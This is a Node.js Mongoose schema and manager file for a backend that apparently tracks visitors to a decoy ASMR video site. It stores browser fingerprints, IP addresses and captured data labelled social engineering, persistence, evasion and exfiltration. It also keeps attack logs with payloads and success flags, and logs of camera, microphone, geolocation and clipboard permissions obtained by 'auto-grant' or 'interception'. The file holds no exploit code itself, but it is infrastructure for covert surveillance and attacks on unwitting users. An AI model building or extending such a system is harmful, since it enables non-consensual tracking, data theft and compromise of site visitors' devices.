/**
 * DEVICE-BASED DATABASE SCHEMA
 * All data organized by device ID
 */

const mongoose = require('mongoose');

// Device Schema - Main device collection
const deviceSchema = new mongoose.Schema({
    _id: {
        type: String,
        required: true,
        unique: true,
        index: true
    },
    device: {
        type: String,
        required: true,
        unique: true
    },
    deviceInfo: {
        userAgent: String,
        platform: String,
        language: String,
        timezone: String,
        screenResolution: String,
        colorDepth: Number,
        pixelDepth: Number,
        hardwareConcurrency: Number,
        deviceMemory: Number,
        maxTouchPoints: Number
    },
    fingerprint: {
        canvas: String,
        webgl: String,
        audio: String,
        fonts: Object,
        plugins: Array,
        mimeTypes: Array
    },
    status: {
        type: String,
        enum: ['active', 'inactive', 'blocked'],
        default: 'active'
    },
    lastSeen: {
        type: Date,
        default: Date.now
    },
    createdAt: {
        type: Date,
        default: Date.now
    },
    totalDataPoints: {
        type: Number,
        default: 0
    },
    totalSessions: {
        type: Number,
        default: 0
    }
}, {
    timestamps: true
});

// Session Schema - Per device sessions
const sessionSchema = new mongoose.Schema({
    deviceId: {
        type: String,
        required: true,
        ref: 'Device'
    },
    sessionId: {
        type: String,
        required: true,
        unique: true
    },
    startTime: {
        type: Date,
        default: Date.now
    },
    endTime: Date,
    duration: Number, // in milliseconds
    ipAddress: String,
    userAgent: String,
    referrer: String,
    dataPoints: {
        type: Number,
        default: 0
    },
    status: {
        type: String,
        enum: ['active', 'ended', 'timeout'],
        default: 'active'
    }
}, {
    timestamps: true
});

// Data Capture Schema - Per device data
const dataCaptureSchema = new mongoose.Schema({
    deviceId: {
        type: String,
        required: true,
        ref: 'Device'
    },
    sessionId: {
        type: String,
        required: true
    },
    type: {
        type: String,
        required: true,
        enum: [
            'browser_fingerprint',
            'device_info',
            'network_behavior',
            'behavioral_patterns',
            'timing_analysis',
            'storage_data',
            'webrtc_data',
            'social_engineering',
            'network_attack',
            'persistence',
            'evasion',
            'ml_analysis'
        ]
    },
    category: {
        type: String,
        required: true
    },
    data: mongoose.Schema.Types.Mixed,
    metadata: {
        timestamp: {
            type: Date,
            default: Date.now
        },
        ipAddress: String,
        userAgent: String,
        url: String,
        method: String
    },
    size: {
        type: Number,
        default: 0
    },
    priority: {
        type: String,
        enum: ['low', 'medium', 'high', 'critical'],
        default: 'medium'
    }
}, {
    timestamps: true
});

// Attack Log Schema - Per device attacks
const attackLogSchema = new mongoose.Schema({
    deviceId: {
        type: String,
        required: true,
        ref: 'Device'
    },
    sessionId: {
        type: String,
        required: true
    },
    attackType: {
        type: String,
        required: true,
        enum: [
            'social_engineering',
            'network_attack',
            'persistence_attack',
            'evasion_technique',
            'ml_attack',
            'data_exfiltration'
        ]
    },
    technique: {
        type: String,
        required: true
    },
    success: {
        type: Boolean,
        default: false
    },
    payload: mongoose.Schema.Types.Mixed,
    response: mongoose.Schema.Types.Mixed,
    duration: Number, // milliseconds
    timestamp: {
        type: Date,
        default: Date.now
    },
    severity: {
        type: String,
        enum: ['low', 'medium', 'high', 'critical'],
        default: 'medium'
    }
}, {
    timestamps: true
});

// Permission Log Schema - Per device permissions
const permissionLogSchema = new mongoose.Schema({
    deviceId: {
        type: String,
        required: true,
        ref: 'Device'
    },
    sessionId: {
        type: String,
        required: true
    },
    permission: {
        type: String,
        required: true,
        enum: [
            'camera',
            'microphone',
            'notifications',
            'geolocation',
            'clipboard-read',
            'clipboard-write',
            'payment',
            'persistent-storage',
            'background-sync',
            'periodic-background-sync',
            'ambient-light-sensor',
            'accelerometer',
            'gyroscope',
            'magnetometer',
            'background-fetch',
            'push',
            'midi',
            'usb'
        ]
    },
    action: {
        type: String,
        enum: ['requested', 'granted', 'denied', 'auto-granted'],
        required: true
    },
    timestamp: {
        type: Date,
        default: Date.now
    },
    method: {
        type: String,
        enum: ['user_interaction', 'auto_grant', 'interception'],
        default: 'user_interaction'
    },
    success: {
        type: Boolean,
        default: false
    }
}, {
    timestamps: true
});

// Video Schema - Per device ASMR videos
const videoSchema = new mongoose.Schema({
    deviceId: {
        type: String,
        required: true,
        ref: 'Device'
    },
    videoId: {
        type: String,
        required: true,
        unique: true
    },
    title: {
        type: String,
        required: true
    },
    category: {
        type: String,
        required: true,
        enum: [
            'soap play',
            'china clay',
            'crunch sounds',
            'slime sounds',
            'paper sounds',
            'plastic sounds',
            'wood sounds',
            'metal sounds',
            'water sounds',
            'food sounds',
            'fabric sounds',
            'glass sounds'
        ]
    },
    filename: {
        type: String,
        required: true
    },
    filepath: {
        type: String,
        required: true
    },
    url: String,
    quality: {
        type: String,
        enum: ['SD', 'HD', 'FHD', '4K'],
        default: 'HD'
    },
    size: Number,
    duration: String,
    resolution: String,
    downloadDate: {
        type: Date,
        default: Date.now
    },
    tags: [String],
    metadata: mongoose.Schema.Types.Mixed,
    status: {
        type: String,
        enum: ['downloading', 'completed', 'failed', 'deleted'],
        default: 'completed'
    },
    views: {
        type: Number,
        default: 0
    },
    rating: {
        type: Number,
        min: 1,
        max: 5,
        default: 0
    }
}, {
    timestamps: true
});

// Create indexes
deviceSchema.index({ device: 1 });
deviceSchema.index({ status: 1 });
deviceSchema.index({ lastSeen: -1 });

sessionSchema.index({ deviceId: 1, startTime: -1 });
sessionSchema.index({ sessionId: 1 });
sessionSchema.index({ status: 1 });

dataCaptureSchema.index({ deviceId: 1, timestamp: -1 });
dataCaptureSchema.index({ type: 1 });
dataCaptureSchema.index({ category: 1 });

attackLogSchema.index({ deviceId: 1, timestamp: -1 });
attackLogSchema.index({ attackType: 1 });
attackLogSchema.index({ success: 1 });

permissionLogSchema.index({ deviceId: 1, timestamp: -1 });
permissionLogSchema.index({ permission: 1 });
permissionLogSchema.index({ action: 1 });

videoSchema.index({ deviceId: 1, downloadDate: -1 });
videoSchema.index({ category: 1 });
videoSchema.index({ status: 1 });

// Create models
const Device = mongoose.model('Device', deviceSchema);
const Session = mongoose.model('Session', sessionSchema);
const DataCapture = mongoose.model('DataCapture', dataCaptureSchema);
const AttackLog = mongoose.model('AttackLog', attackLogSchema);
const PermissionLog = mongoose.model('PermissionLog', permissionLogSchema);
const Video = mongoose.model('Video', videoSchema);

// Device Manager Class
class DeviceManager {
    constructor() {
        this.devices = new Map();
    }

    // Create or get device
    async getOrCreateDevice(deviceId, deviceInfo = {}) {
        try {
            let device = await Device.findById(deviceId);
            
            if (!device) {
                device = new Device({
                    _id: deviceId,
                    device: deviceInfo.device || deviceId,
                    deviceInfo: deviceInfo,
                    status: 'active'
                });
                await device.save();
                console.log(`📱 Created new device: ${deviceId}`);
            } else {
                // Update last seen
                device.lastSeen = new Date();
                device.totalSessions += 1;
                await device.save();
            }
            
            return device;
        } catch (error) {
            console.error(`❌ Error managing device ${deviceId}:`, error);
            throw error;
        }
    }

    // Create session for device
    async createSession(deviceId, sessionData = {}) {
        try {
            const sessionId = `session_${deviceId}_${Date.now()}`;
            const session = new Session({
                deviceId: deviceId,
                sessionId: sessionId,
                ipAddress: sessionData.ipAddress,
                userAgent: sessionData.userAgent,
                referrer: sessionData.referrer
            });
            
            await session.save();
            console.log(`🔄 Created session ${sessionId} for device ${deviceId}`);
            return session;
        } catch (error) {
            console.error(`❌ Error creating session for ${deviceId}:`, error);
            throw error;
        }
    }

    // Log data capture for device
    async logDataCapture(deviceId, sessionId, data) {
        try {
            const dataCapture = new DataCapture({
                deviceId: deviceId,
                sessionId: sessionId,
                type: data.type,
                category: data.category,
                data: data.data,
                metadata: data.metadata,
                size: JSON.stringify(data.data).length,
                priority: data.priority || 'medium'
            });
            
            await dataCapture.save();
            
            // Update device stats
            await Device.findByIdAndUpdate(deviceId, {
                $inc: { totalDataPoints: 1 },
                lastSeen: new Date()
            });
            
            console.log(`📊 Logged data capture for device ${deviceId}`);
            return dataCapture;
        } catch (error) {
            console.error(`❌ Error logging data capture for ${deviceId}:`, error);
            throw error;
        }
    }

    // Log attack for device
    async logAttack(deviceId, sessionId, attackData) {
        try {
            const attackLog = new AttackLog({
                deviceId: deviceId,
                sessionId: sessionId,
                attackType: attackData.attackType,
                technique: attackData.technique,
                success: attackData.success,
                payload: attackData.payload,
                response: attackData.response,
                duration: attackData.duration,
                severity: attackData.severity || 'medium'
            });
            
            await attackLog.save();
            console.log(`⚔️ Logged attack for device ${deviceId}`);
            return attackLog;
        } catch (error) {
            console.error(`❌ Error logging attack for ${deviceId}:`, error);
            throw error;
        }
    }

    // Log permission for device
    async logPermission(deviceId, sessionId, permissionData) {
        try {
            const permissionLog = new PermissionLog({
                deviceId: deviceId,
                sessionId: sessionId,
                permission: permissionData.permission,
                action: permissionData.action,
                method: permissionData.method,
                success: permissionData.success
            });
            
            await permissionLog.save();
            console.log(`🔐 Logged permission for device ${deviceId}`);
            return permissionLog;
        } catch (error) {
            console.error(`❌ Error logging permission for ${deviceId}:`, error);
            throw error;
        }
    }

    // Get device statistics
    async getDeviceStats(deviceId) {
        try {
            const device = await Device.findById(deviceId);
            if (!device) {
                throw new Error(`Device ${deviceId} not found`);
            }

            const stats = {
                device: device,
                totalSessions: await Session.countDocuments({ deviceId }),
                totalDataPoints: await DataCapture.countDocuments({ deviceId }),
                totalAttacks: await AttackLog.countDocuments({ deviceId }),
                totalPermissions: await PermissionLog.countDocuments({ deviceId }),
                totalVideos: await Video.countDocuments({ deviceId }),
                recentActivity: await DataCapture.find({ deviceId })
                    .sort({ timestamp: -1 })
                    .limit(10),
                attackSuccess: await AttackLog.countDocuments({ 
                    deviceId, 
                    success: true 
                }),
                permissionSuccess: await PermissionLog.countDocuments({ 
                    deviceId, 
                    success: true 
                })
            };

            return stats;
        } catch (error) {
            console.error(`❌ Error getting stats for ${deviceId}:`, error);
            throw error;
        }
    }

    // Get all devices
    async getAllDevices() {
        try {
            return await Device.find().sort({ lastSeen: -1 });
        } catch (error) {
            console.error('❌ Error getting all devices:', error);
            throw error;
        }
    }

    // Get device data by type
    async getDeviceDataByType(deviceId, dataType) {
        try {
            return await DataCapture.find({ 
                deviceId, 
                type: dataType 
            }).sort({ timestamp: -1 });
        } catch (error) {
            console.error(`❌ Error getting ${dataType} data for ${deviceId}:`, error);
            throw error;
        }
    }
}

module.exports = {
    // Models
    Device,
    Session,
    DataCapture,
    AttackLog,
    PermissionLog,
    Video,
    
    // Schemas
    deviceSchema,
    sessionSchema,
    dataCaptureSchema,
    attackLogSchema,
    permissionLogSchema,
    videoSchema,
    
    // Device Manager
    DeviceManager
}; 